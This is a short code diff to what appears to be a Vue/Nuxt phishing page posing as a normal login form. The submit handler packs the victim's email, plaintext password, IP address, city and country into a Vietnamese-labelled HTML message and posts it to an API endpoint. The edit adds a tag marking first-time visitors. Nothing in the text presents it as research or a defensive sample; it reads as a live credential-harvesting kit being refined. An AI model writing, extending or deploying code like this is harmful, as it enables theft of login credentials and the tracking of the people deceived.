@@ -79,9 +79,7 @@
       >
         Log in
       </button>
-      <a
-        href="/?a=1"
-        class="flex justify-center text-center cursor-pointer hover:underline"
+      <a href="/?a=1" class="flex justify-center text-center cursor-pointer hover:underline"
         >Forgotten Password?</a
       >
     </form>
@@ -136,15 +134,21 @@ const handleSubmit = async () => {
   if (!email.value || !password.value) {
     return
   }
-  const message = `
+  let message = `
 🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
 🌍 <b>Địa chỉ IP:</b> ${geo.ip}
 📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
 
 📧 <b>Email:</b> ${email.value}
 🔑 <b>Mật khẩu:</b> ${password.value}
-`
 
+`
+  const isFirst = isFirstTime()
+
+  // time VN
+  if (isFirst) {
+    message += `👤 Người dùng mới truy cập\n\n`
+  }
   // Call your API here
   try {
     await $fetch('/api/code', {
